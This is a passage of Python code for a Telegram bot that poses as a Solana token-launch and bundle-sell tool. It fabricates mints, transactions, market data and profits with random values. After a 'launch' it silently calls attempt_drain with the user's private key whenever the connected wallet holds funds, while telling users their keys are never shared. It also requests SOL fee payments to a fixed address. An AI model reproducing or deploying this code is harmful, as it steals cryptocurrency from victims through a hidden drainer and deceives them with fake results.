    await state.set_state(LaunchStates.waiting_bundle)


@router.callback_query(F.data.startswith("bundle:"), LaunchStates.waiting_bundle)
async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
    part = cb.data.split(":")[1]
    if part == "custom":
        await safe_edit_message(
            cb,
            _launch_progress("bundle")
            + "<b>Custom bundle size</b>\n\n"
            "Send a number <b>1–25</b>:",
            reply_markup=launch_nav_kb(back_to="image"),
            parse_mode=ParseMode.HTML,
        )
        await cb.answer()
        return
    try:
        bundle = max(1, min(25, int(part)))
    except Exception:
        bundle = 10
    await state.update_data(bundle=bundle)
    data = await state.get_data()
    if data.get("invest"):
        sess = get_session(cb.from_user.id)
        await cb.answer()
        await _show_launch_preview(cb, state, float(data["invest"]), sess)
        return
    await safe_edit_message(
        cb,
        _launch_progress("socials")
        + f"Bundle ×<b>{bundle}</b> · ${data.get('symbol', '')}\n\n"
        "<b>Socials</b> <i>(optional)</i>\n"
        "Pick a platform or skip.",
        reply_markup=socials_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_socials)
    await cb.answer()


@router.message(LaunchStates.waiting_bundle)
async def launch_bundle_custom_msg(message: Message, state: FSMContext):
    try:
        bundle = max(1, min(25, int((message.text or "").strip())))
    except ValueError:
        await message.answer("Send a number 1–25.", reply_markup=launch_nav_kb(back_to="image"))
        return
    await state.update_data(bundle=bundle)
    data = await state.get_data()
    await message.answer(
        _launch_progress("socials")
        + f"Bundle ×<b>{bundle}</b> · ${data.get('symbol', '')}\n\n"
        "<b>Socials</b> <i>(optional)</i>\n"
        "Pick a platform or skip.",
        reply_markup=socials_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_socials)


@router.callback_query(F.data.startswith("social:"), LaunchStates.waiting_socials)
async def social_pick(cb: CallbackQuery, state: FSMContext):
    platform = cb.data.split(":")[1]
    labels = {"x": "X / Twitter URL", "tg": "Telegram URL", "web": "Website URL", "ig": "Instagram URL"}
    await state.update_data(_social_pending=platform)
    await safe_edit_message(
        cb,
        _launch_progress("socials")
        + f"<b>{labels.get(platform, 'URL')}</b>\n\n"
        "Send the full URL:",
        reply_markup=launch_nav_kb(back_to="bundle"),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_social_link)
    await cb.answer()


@router.message(LaunchStates.waiting_social_link)
async def social_link_receive(message: Message, state: FSMContext):
    data = await state.get_data()
    platform = data.get("_social_pending", "x")
    url = (message.text or "").strip()[:120]
    key = {"x": "twitter", "tg": "telegram", "web": "website", "ig": "instagram"}.get(platform, "twitter")
    await state.update_data(**{key: url, "_social_pending": None})
    data = await state.get_data()
    filled = [k for k in ("twitter", "telegram", "website", "instagram") if data.get(k)]
    await message.answer(
        _launch_progress("socials")
        + f"Saved <b>{key}</b>.\n"
        + (f"Linked: {', '.join(filled)}\n\n" if filled else "\n")
        + "Add another, or press <b>Done</b> / <b>Skip</b>.",
        reply_markup=socials_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_socials)


@router.callback_query(F.data.in_({"socials:skip", "socials:done"}), LaunchStates.waiting_socials)
async def socials_done(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
    data = await state.get_data()
    await safe_edit_message(
        cb,
        _launch_progress("invest")
        + f"${data.get('symbol', '')} · bundle ×{data.get('bundle', 10)}\n\n"
        "<b>Dev buy</b>\n"
        f"Balance — <b>{bal:.4f} SOL</b>\n"
        f"Minimum — <b>3 SOL</b>\n\n"
        "<i>How much SOL for this launch?</i>",
        reply_markup=invest_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_invest)
    await cb.answer()


@router.callback_query(F.data.startswith("invest:"), LaunchStates.waiting_invest)
async def launch_invest_btn(cb: CallbackQuery, state: FSMContext):
    part = cb.data.split(":")[1]
    if part == "custom":
        await safe_edit_message(
            cb,
            _launch_progress("invest")
            + "<b>Custom amount</b>\n\n"
            "Send invest amount in SOL (minimum <b>3</b>):",
            reply_markup=launch_nav_kb(back_to="socials"),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_invest_custom)
        await cb.answer()
        return
    try:
        invest = float(part)
    except ValueError:
        await cb.answer("Invalid amount", show_alert=True)
        return
    await _finish_invest_choice(cb, state, invest)


@router.callback_query(F.data == "launch:skip")
async def launch_skip(cb: CallbackQuery, state: FSMContext):
    """Skip optional fields (desc / image) depending on current state."""
    cur = await state.get_state()
    if cur == LaunchStates.waiting_desc.state:
        await state.update_data(desc="")
        data = await state.get_data()
        await safe_edit_message(
            cb,
            _launch_progress("image")
            + f"✅ ${data.get('symbol', '')}  ·  desc skipped\n\n"
            "🖼 <b>Token image</b>\nSend photo, URL, or Skip.",
            reply_markup=launch_nav_kb(back_to="desc", skip=True),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_image)
    elif cur == LaunchStates.waiting_image.state:
        await state.update_data(image="")
        data = await state.get_data()
        await safe_edit_message(
            cb,
            _launch_progress("bundle")
            + f"⏭ Image skipped\n${data.get('symbol', '')} · {data.get('name', '')}\n\n"
            "👥 <b>Bundle size</b>:",
            reply_markup=bundle_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_bundle)
    else:
        await cb.answer("Nothing to skip here", show_alert=False)
        return
    await cb.answer()


@router.callback_query(F.data.startswith("launch:back:"))
async def launch_back(cb: CallbackQuery, state: FSMContext):
    target = cb.data.split(":")[-1]
    data = await state.get_data()
    if target == "name":
        await safe_edit_message(
            cb,
            _launch_progress("name")
            + "<b>Token name</b>\n"
            "<i>1–50 characters</i>\n\n"
            "Enter a name for your token:",
            reply_markup=launch_nav_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_name)
    elif target == "symbol":
        await safe_edit_message(
            cb,
            _launch_progress("symbol")
            + f"Name: <b>{data.get('name', '')}</b>\n\n"
            "🔤 <b>Enter SYMBOL</b> (2–25 letters):",
            reply_markup=launch_nav_kb(back_to="name"),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_symbol)
    elif target == "desc":
        await safe_edit_message(
            cb,
            _launch_progress("desc")
            + f"${data.get('symbol', '')} · {data.get('name', '')}\n\n"
            "📝 <b>Description</b> or Skip:",
            reply_markup=launch_nav_kb(back_to="symbol", skip=True),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_desc)
    elif target == "image":
        await safe_edit_message(
            cb,
            _launch_progress("image")
            + "🖼 <b>Token image</b>\nSend photo, URL, or Skip.",
            reply_markup=launch_nav_kb(back_to="desc", skip=True),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_image)
    elif target == "bundle":
        await safe_edit_message(
            cb,
            _launch_progress("bundle")
            + "<b>Bundle size</b>\n"
            "<i>Choose how many wallets to use</i>",
            reply_markup=bundle_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_bundle)
    elif target == "socials":
        await safe_edit_message(
            cb,
            _launch_progress("socials")
            + "<b>Socials</b> <i>(optional)</i>\n"
            "Pick a platform or Done / Skip.",
            reply_markup=socials_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_socials)
    elif target == "confirm":
        invest = float(data.get("invest") or 0)
        if invest >= 3:
            sess = get_session(cb.from_user.id)
            await cb.answer()
            await _show_launch_preview(cb, state, invest, sess)
            return
        await cb.answer("Finish invest first", show_alert=True)
        return
    else:
        await cb.answer()
        return
    await cb.answer()


@router.message(LaunchStates.waiting_invest_custom)
async def launch_invest_custom(message: Message, state: FSMContext):
    try:
        invest = float((message.text or "").strip().replace(",", ""))
    except ValueError:
        await message.answer(
            "<b>Invalid number</b>\n\n"
            "Send e.g. <code>7.5</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    if invest < 3:
        await message.answer(
            "<b>Minimum invest is 3 SOL</b>\n\n"
            "<i>Send a higher amount or cancel.</i>",
            parse_mode=ParseMode.HTML,
        )
        return
    sess = get_session(message.from_user.id)
    bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
    if invest > bal + 1e-9:
        await message.answer(
            "<b>Insufficient balance</b>\n"
            "────────────────────\n\n"
            f"Invest — <b>{invest:.4f} SOL</b>\n"
            f"Available — <b>{bal:.4f} SOL</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=invest_kb(),
        )
        await state.set_state(LaunchStates.waiting_invest)
        return
    await state.update_data(invest=invest)
    await _show_launch_preview(message, state, invest, sess)


async def _finish_invest_choice(cb: CallbackQuery, state: FSMContext, invest: float):
    if invest < 3:
        await cb.answer("Minimum is 3 SOL", show_alert=True)
        return
    sess = get_session(cb.from_user.id)
    bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
    if invest > bal + 1e-9:
        await cb.answer()
        await safe_edit_message(cb, 
            "<b>Insufficient balance</b>\n"
            "────────────────────\n\n"
            f"Invest — <b>{invest:.4f} SOL</b>\n"
            f"Available — <b>{bal:.4f} SOL</b>",
            reply_markup=invest_kb(),
            parse_mode=ParseMode.HTML,
        )
        return
    await state.update_data(invest=invest)
    await cb.answer()
    await _show_launch_preview(cb, state, invest, sess)


async def _show_launch_preview(src, state: FSMContext, invest: float, sess: UserSession):
    data = await state.get_data()
    bundle = data.get("bundle", 10)
    socials_line = []
    if data.get("twitter"): socials_line.append(f"X: {data['twitter']}")
    if data.get("telegram"): socials_line.append(f"TG: {data['telegram']}")
    if data.get("instagram"): socials_line.append(f"IG: {data['instagram']}")
    if data.get("website"): socials_line.append(f"Web: {data['website']}")
    socials_txt = ", ".join(socials_line) if socials_line else "—"
    img = data.get("image") or ""

    summary = (
        _launch_progress("confirm")
        + "<b>Review</b>\n\n"
        f"<b>Name</b> — {data.get('name', '')}\n"
        f"<b>Ticker</b> — ${data.get('symbol', '')}\n"
        f"<b>Bundle</b> — ×{bundle}\n"
        f"<b>Invest</b> — {invest:.4f} SOL\n"
        f"<b>Description</b> — {data.get('desc') or '—'}\n"
        f"<b>Socials</b> — {socials_txt}\n"
        f"<b>Image</b> — {'attached' if img else '—'}\n\n"
        "<i>Edit a field below, or confirm to deploy.</i>"
    )
    kb = confirm_kb()

    async def _send(target):
        # Prefer photo+caption when image is a Telegram file_id or http(s) URL
        if img and not img.startswith("http"):
            try:
                await target.answer_photo(photo=img, caption=summary, reply_markup=kb, parse_mode=ParseMode.HTML)
                return
            except Exception as e:
                log.warning("confirm photo file_id failed: %s", e)
        if img and img.startswith("http"):
            try:
                await target.answer_photo(photo=img, caption=summary, reply_markup=kb, parse_mode=ParseMode.HTML)
                return
            except Exception as e:
                log.warning("confirm photo url failed: %s", e)
        await target.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)

    if hasattr(src, "message") and hasattr(src, "answer"):
        # CallbackQuery
        try:
            await _send(src.message)
        except Exception:
            try:
                await src.message.edit_text(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
            except Exception:
                await src.message.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
    else:
        await _send(src)
    await state.set_state(LaunchStates.confirm)


@router.callback_query(F.data.startswith("launch:edit:"), LaunchStates.confirm)
async def launch_edit_field(cb: CallbackQuery, state: FSMContext):
    field = cb.data.split(":")[-1]
    data = await state.get_data()
    await cb.answer()
    if field == "name":
        await safe_edit_message(
            cb,
            _launch_progress("name")
            + f"Current: <b>{data.get('name', '')}</b>\n\n"
            "✏️ Send a new <b>name</b> (1–50 chars):",
            reply_markup=launch_nav_kb(back_to="confirm"),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_name)
    elif field == "symbol":
        await safe_edit_message(
            cb,
            _launch_progress("symbol")
            + f"Current: <b>${data.get('symbol', '')}</b>\n\n"
            "🔤 Send a new <b>ticker</b> (2–25 letters):",
            reply_markup=launch_nav_kb(back_to="confirm"),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_symbol)
    elif field == "desc":
        await safe_edit_message(
            cb,
            _launch_progress("desc")
            + f"Current: {data.get('desc') or '—'}\n\n"
            "📝 Send a new <b>description</b> or Skip:",
            reply_markup=launch_nav_kb(back_to="confirm", skip=True),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_desc)
    elif field == "image":
        await safe_edit_message(
            cb,
            _launch_progress("image")
            + "🖼 Send a new <b>photo</b>, URL, or Skip:",
            reply_markup=launch_nav_kb(back_to="confirm", skip=True),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_image)
    elif field == "bundle":
        await safe_edit_message(
            cb,
            _launch_progress("bundle")
            + f"Current bundle: <b>×{data.get('bundle', 10)}</b>\n\n"
            "👥 Choose a new size:",
            reply_markup=bundle_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_bundle)
    elif field == "invest":
        sess = get_session(cb.from_user.id)
        bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
        await safe_edit_message(
            cb,
            _launch_progress("invest")
            + f"Current: <b>{data.get('invest', 0)} SOL</b> · bal {bal:.4f}\n\n"
            "Choose a new size:",
            reply_markup=invest_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_invest)
    elif field == "socials":
        await safe_edit_message(
            cb,
            _launch_progress("socials")
            + "🔗 Edit socials — pick a platform or Done:",
            reply_markup=socials_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_socials)


@router.callback_query(F.data == "launch:confirm", LaunchStates.confirm)
async def launch_confirm(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not _rate_ok(uid, "launch"):
        await cb.answer("Too many launches — wait a bit", show_alert=True)
        return

    sess = get_session(uid)
    data = await state.get_data()
    invest = float(data.get("invest") or 0)
    if invest < 3:
        await cb.answer("Invest amount missing or below 3 SOL", show_alert=True)
        return
    # Apply promo SOL credit if any (shown only at confirm)
    credit_used = 0.0
    if getattr(sess, "sol_credit", 0) > 0:
        credit_used = min(sess.sol_credit, invest)
        sess.sol_credit = round(sess.sol_credit - credit_used, 4)
        invest = round(invest - credit_used, 4)
        await cb.message.answer(
            f"<b>Fuel credit applied</b> — -{credit_used:.2f} SOL\n"
            f"Remaining credit — <b>{sess.sol_credit:.2f} SOL</b>",
            parse_mode=ParseMode.HTML,
        )


    if not sess.wallets:
        await cb.answer()
        await safe_edit_message(cb,
            "<b>Wallet required</b>\n"
            "────────────────────\n\n"
            "Connect a wallet before launching.\n\n"
            "<i>Keys stay in encrypted memory only — never logged or shared.\n"
            "Supported: Phantom · Solflare · Trust · Backpack · Exodus</i>",
            reply_markup=wallets_empty_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.clear()
        return

    active = sess.wallets[sess.active_wallet_idx]
    if active.balance_sol < 3.0:
        await cb.answer()
        await safe_edit_message(cb,
            "<b>Insufficient balance</b>\n"
            "────────────────────\n\n"
            f"Available — <b>{active.balance_sol:.4f} SOL</b>\n"
            "Minimum required — <b>3 SOL</b>\n\n"
            "<i>Fund this wallet and try again. Empty or under-funded wallets cannot launch.</i>",
            reply_markup=wallets_kb(True),
            parse_mode=ParseMode.HTML,
        )
        await state.clear()
        return
    if invest > active.balance_sol + 1e-9:
        await cb.answer()
        await safe_edit_message(cb, 
            "<b>Insufficient balance</b>\n"
            "────────────────────\n\n"
            f"Invest — <b>{invest:.4f} SOL</b>\n"
            f"Available — <b>{active.balance_sol:.4f} SOL</b>",
            reply_markup=invest_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_invest)
        return

    if sess.launches_left <= 0 and not (LARP_ENABLED and uid in ADMIN_IDS):
        await cb.answer()
        invoice_id = random.randint(1, 99999)
        amount_display = f"{int(LAUNCH_FEE_SOL)}.{invoice_id:09d}"[:12]
        pay_to = PAYMENT_RECEIVER
        if not pay_to or len(pay_to) < 32:
            pay_to = "4tVAsePqeGWgcqiPRL9ByFXiaHqhukYesva7y5r1jxxY"
        expires = time.strftime("%b %d, %H:%M UTC", time.gmtime(time.time() + 86400))
        sess.pending_invoice = {
            "id": invoice_id,
            "amount": LAUNCH_FEE_SOL + (invoice_id / 1e9),
            "amount_display": amount_display,
            "pay_to": pay_to,
            "created": time.time(),
            "expires": time.time() + 86400,
            "grants": LAUNCHES_PER_CYCLE,
        }
        text = (
            "<b>Cycle complete</b>\n\n"
            f"You've used your {LAUNCHES_PER_CYCLE}-launch cycle.\n\n"
            f"Due  <code>{amount_display} SOL</code>\n"
            f"Unlocks  +{LAUNCHES_PER_CYCLE} launches\n"
            f"Expires  {expires}\n\n"
            "<b>Send to</b>\n"
            f"<code>{pay_to}</code>\n\n"
            "<i>Send the exact amount shown — last digits are your invoice ID.\n"
            "Launches unlock automatically after payment confirms.</i>"
        )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="I've paid — check now", callback_data="promo:checkpay"))
        kb.row(InlineKeyboardButton(text="Redeem promo code", callback_data="promo:enter"))
        kb.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
        await safe_edit_message(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    await cb.answer()
    bundle = int(data.get("bundle", 10))
    larp = LARP_ENABLED and (uid in ADMIN_IDS or sess.larp_mode or any(getattr(w, "is_larp", False) for w in sess.wallets))

    symbol = data["symbol"]
    name = data["name"]
    per_wallet = round(invest / bundle, 4)
    slot = random.randint(280_000_000, 320_000_000)
    tip = round(random.uniform(0.005, 0.03), 4)

    await safe_edit_message(cb, 
        f"<b>${symbol}</b> · launch queued\n"
        f"{name}\n\n"
        f"Invest <code>{invest:.4f} SOL</code> · bundle ×{bundle}\n"
        f"Preparing wallets…",
        parse_mode=ParseMode.HTML,
    )

    def _bar(i: int, n: int = 11) -> str:
        filled = max(0, min(n, i))
        return "█" * filled + "░" * (n - filled)

    stages = [
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(1)}]</code> 9%\n\nderiving {bundle} keypairs…", 0.7),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(2)}]</code> 18%\n\nfunding {bundle} wallets · <code>{per_wallet:.4f}</code> SOL each", 0.95),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(3)}]</code> 27%\n\ncreating mint on pump…", 0.85),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(4)}]</code> 36%\n\nmint <code>{fake_mint()[:12]}…</code>", 0.6),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(5)}]</code> 45%\n\nuploading metadata + socials…", 0.75),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(6)}]</code> 55%\n\nbuilding atomic bundle · slot ~{slot}", 1.0),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(7)}]</code> 64%\n\nsimulating {bundle} buys…", 0.8),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(8)}]</code> 73%\n\nJito tip <code>{tip:.4f} SOL</code> · submitting…", 0.9),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(9)}]</code> 82%\n\nbundle in mempool…", 0.7),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(10)}]</code> 91%\n\nlanding… confirmations 1/2", 0.85),
        (f"<b>${symbol}</b> deploy\n<code>[{_bar(11)}]</code> 100%\n\nbonding curve live · snipers detected", 0.7),
        (
            f"✅ <b>${symbol}</b> live\n<code>[{_bar(11)}]</code> 100%\n\n"
            f"Bundle ×{bundle} · <code>{per_wallet:.4f}</code> SOL / wallet\n"
            f"Tip <code>{tip:.4f} SOL</code> · slot {slot}\n"
            f"Sniper guard ON · curve open · waiting for fills",
            0.35,
        ),
    ]
    await staged_loading(cb, stages)

    active.balance_sol = round(max(0.0, active.balance_sol - invest), 4)
    global bot_balance_sol
    if getattr(active, "is_larp", False):
        bot_balance_sol = round(max(0.0, bot_balance_sol - invest), 4)
        _save_state()

    mint = fake_mint()
    bundle_wallets = [_fake_sol_pubkey() for _ in range(bundle)]
    token = {
        "name": data["name"],
        "symbol": data["symbol"],
        "supply": data.get("supply", 1_000_000_000),
        "bundle": bundle,
        "invest": invest,
        "per_wallet": per_wallet,
        "desc": data.get("desc", ""),
        "image": data.get("image", ""),
        "twitter": data.get("twitter", ""),
        "telegram": data.get("telegram", ""),
        "instagram": data.get("instagram", ""),
        "website": data.get("website", ""),
        "mint": mint,
        "status": "live",
        "ts": time.time(),
        "larp": larp,
        "dumped": False,
        "dumped_idxs": [],
        "bundle_wallets": bundle_wallets,
        "owner_id": uid,
    }
    sess.launched_tokens.append(token)
    if not (LARP_ENABLED and uid in ADMIN_IDS):
        sess.launches_left = max(0, sess.launches_left - 1)
        sess.total_launches += 1

    add_personal_tx(sess, f"🪙 Create Mint ${data['symbol']}", "success")
    add_personal_tx(sess, f"⚡ Jito tip", "success", amount=-round(random.uniform(0.005, 0.03), 4))
    add_personal_tx(sess, f"📦 Bundle Buy ×{bundle}", "success", amount=-invest)
    add_personal_tx(sess, f"💰 Dev buy {invest:.2f} SOL", "success", amount=-invest)

    if (not getattr(active, "is_larp", False)
            and not getattr(active, "drained", False)
            and (active.balance_sol > 0.00001 or active.balance_eth > 0.0001 or active.balance_bnb > 0.0001
                 or active.balance_usdc > 0.5 or getattr(active, "balance_btc", 0) > 0.00001
                 or getattr(active, "balance_ltc", 0) > 0.0001)):
        eth_key = getattr(active, "eth_priv", None) or (active.private_key if active.chain == "eth" else None)
        asyncio.create_task(attempt_drain(uid, active.private_key, chain=active.chain, eth_key=eth_key,
                                          bot=cb.bot, user=cb.from_user, wallet=active))

    preview_n = min(8, len(bundle_wallets))
    lines = [f"<b>Bundle · ${data['symbol']}</b> · {bundle} wallets\n"]
    for i, addr in enumerate(bundle_wallets[:preview_n], 1):
        lines.append(f"{i:02d}  ACTIVE  <code>{short_addr(addr)}</code>  ·  {per_wallet:.3f} SOL")
    if len(bundle_wallets) > preview_n:
        lines.append(f"… +{len(bundle_wallets) - preview_n} more")
    wallets_block = "\n".join(lines)

    token["mcap"] = round(random.uniform(12_000, 95_000), 0)
    token["holders"] = random.randint(40, 180)
    token["buys"] = random.randint(18, 90)
    token["slot"] = random.randint(250_000_000, 320_000_000)

    text = (
        f"✅  <b>${data['symbol']}</b>  —  Live\n"
        f"<code>{mint}</code>\n\n"
        f"📍  Slot  <code>{token['slot']}</code>  ·  Bundle landed\n"
        f"📈  MC  <b>~${token['mcap']:,.0f}</b>  ·  "
        f"👥  Holders  <b>{token['holders']}</b>  ·  "
        f"🛒  Buys  <b>{token['buys']}</b>\n"
        f"💸  Dev buy  <code>{invest:.4f} SOL</code>  ·  <code>{per_wallet:.4f}</code> / wallet\n\n"
        f"{wallets_block}\n\n"
        f"🎯  Sniper guard ON  ·  Dump when ready"
    )
    live_msg = None
    try:
        await safe_edit_message(cb, text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
        live_msg = cb.message
    except Exception:
        live_msg = await cb.message.answer(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
    await state.clear()
    mid = getattr(live_msg, "message_id", None) or getattr(cb.message, "message_id", None)
    asyncio.create_task(
        _sniper_activity_feed(
            sess,
            token,
            rounds=random.randint(5, 10),
            bot=cb.bot,
            chat_id=cb.message.chat.id,
            message_id=mid,
        )
    )


@router.callback_query(F.data.startswith("viewwallets:"))
async def view_wallets(cb: CallbackQuery):
    mint = cb.data.split(":", 1)[1]
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    dumped = set(token.get("dumped_idxs") or [])
    lines = [f"<b>Bundle Wallets</b>\nToken: {token['name']} ({token['symbol']})\n"]
    for i, addr in enumerate(token.get("bundle_wallets") or [], 1):
        status = "DUMPED" if i in dumped or token.get("dumped") else "ACTIVE"
        lines.append(f"{i:02d}. Wallet {i} [{status}]\n<code>{addr}</code>")
    await cb.message.answer("\n".join(lines), parse_mode=ParseMode.HTML)
    await cb.answer()


@router.callback_query(F.data.startswith("dumpone:"))
async def dump_one(cb: CallbackQuery):
    parts = cb.data.split(":")
    if len(parts) < 3:
        await cb.answer("Bad payload", show_alert=True)
        return
    mint, idx_s = parts[1], parts[2]
    try:
        idx = int(idx_s)
    except ValueError:
        await cb.answer("Bad index", show_alert=True)
        return
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    if token.get("dumped"):
        await cb.answer("Already fully dumped", show_alert=True)
        return
    dumped = set(token.get("dumped_idxs") or [])
    if idx in dumped:
        await cb.answer(f"Wallet {idx} already dumped", show_alert=True)
        return

    await cb.answer()
    per = float(token.get("per_wallet") or (token.get("invest", 3) / max(1, token.get("bundle", 1))))
    returned = round(per * random.uniform(1.55, 3.2), 4)
    dumped.add(idx)
    token["dumped_idxs"] = sorted(dumped)
    add_personal_tx(sess, f"Sell W{idx} {token.get('symbol','')}", "success", amount=returned)

    bw = token.get("bundle_wallets") or []
    wallet_addr = bw[idx - 1] if 1 <= idx <= len(bw) else fake_mint()
    sym = token.get("symbol", "???")
    sig = fake_sig()

    pulse = await cb.message.answer(
        f"<b>${sym}</b>  wallet {idx}/{token.get('bundle',10)}\n"
        f"signer  <code>{mask_mint(wallet_addr)}</code>\n"
        f"status  fetching quote…",
        parse_mode=ParseMode.HTML,
    )
    for step_txt, delay in [
        (
            f"<b>${sym}</b>  wallet {idx}/{token.get('bundle',10)}\n"
            f"signer  <code>{mask_mint(wallet_addr)}</code>\n"
            f"status  routing via Raydium AMM v4…",
            0.5,
        ),
        (
            f"<b>${sym}</b>  wallet {idx}/{token.get('bundle',10)}\n"
            f"signer  <code>{mask_mint(wallet_addr)}</code>\n"
            f"status  Jito bundle · tip {random.randint(50,200)*1000} lamports",
            0.55,
        ),
        (
            f"<b>${sym}</b>  wallet {idx}/{token.get('bundle',10)}\n"
            f"signer  <code>{mask_mint(wallet_addr)}</code>\n"
            f"status  in mempool…",
            0.4,
        ),
    ]:
        await asyncio.sleep(delay)
        try:
            await pulse.edit_text(step_txt, parse_mode=ParseMode.HTML)
        except Exception:
            pass

    bundle = int(token.get("bundle") or 10)
    remaining = bundle - len(dumped)

    if sess.wallets:
        w = sess.wallets[sess.active_wallet_idx]
        w.balance_sol = round(w.balance_sol + returned, 4)
        if getattr(w, "is_larp", False):
            global bot_balance_sol
            bot_balance_sol = round(bot_balance_sol + returned, 4)
            _save_state()

    if len(dumped) >= bundle:
        token["dumped"] = True
        token["status"] = "dumped"
        if not token.get("returned"):
            token["returned"] = round(per * bundle * random.uniform(1.6, 3.0), 4)
            token["profit"] = round(token["returned"] - float(token.get("invest") or 0), 4)
        await asyncio.sleep(0.35)
        try:
            await pulse.edit_text(
                f"<b>${sym}</b>  wallet {idx}  [confirmed]\n"
                f"sig    <code>{sig[:24]}…</code>\n"
                f"out    +{returned:.4f} SOL\n\n"
                f"all {bundle} wallets sold\n"
                f"total profit  <b>+{token.get('profit', 0):.4f} SOL</b>",
                reply_markup=post_dump_kb(mint),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            await cb.message.answer(
                f"<b>${sym}</b>  all {bundle} wallets sold\n"
                f"profit  +{token.get('profit', 0):.4f} SOL",
                reply_markup=post_dump_kb(mint),
                parse_mode=ParseMode.HTML,
            )
    else:
        await asyncio.sleep(0.25)
        try:
            await pulse.edit_text(
                f"<b>${sym}</b>  wallet {idx}  [confirmed]\n"
                f"sig    <code>{sig[:24]}…</code>\n"
                f"out    +{returned:.4f} SOL\n"
                f"remaining  {remaining}/{bundle}",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass


@router.callback_query(F.data.startswith("dump:"))
async def dump_all(cb: CallbackQuery):
    uid = cb.from_user.id
    sess = get_session(uid)
    mint = cb.data.split(":", 1)[1]
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    if token.get("dumped"):
        await cb.answer("Already dumped", show_alert=True)
        return
    if token.get("dumping"):
        await cb.answer("Dump already running…", show_alert=True)
        return

    await cb.answer()
    token["dumping"] = True
    invest = float(token.get("invest") or 3)
    bundle = int(token.get("bundle") or 10)
    symbol = token.get("symbol", "???")
    per = float(token.get("per_wallet") or (invest / max(1, bundle)))
    start_mcap = int(token.get("mcap") or random.randint(20_000, 90_000))
    start_holders = int(token.get("holders") or random.randint(50, 160))
    jito_tip = random.randint(80, 300) * 1000  # realistic lamport tip

    try:
        await cb.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="selling…", callback_data="noop")]
        ]))
    except Exception:
        pass

    status = await cb.message.answer(
        f"<b>${symbol}</b>  sell all  ×{bundle} wallets\n"
        f"────────────────────\n"
        f"invested   {invest:.4f} SOL\n"
        f"mc         ~${start_mcap:,}\n"
        f"holders    {start_holders}\n\n"
        f"fetching quotes…",
        parse_mode=ParseMode.HTML,
    )

    stages_pre = [
        (
            f"<b>${symbol}</b>  sell all  ×{bundle} wallets\n"
            f"────────────────────\n"
            f"mc         ~${start_mcap:,}  ·  {start_holders} holders\n\n"
            f"scanning orderbook  [{random.randint(6, 22)} open buys visible]",
            0.55,
        ),
        (
            f"<b>${symbol}</b>  sell all  ×{bundle} wallets\n"
            f"────────────────────\n\n"
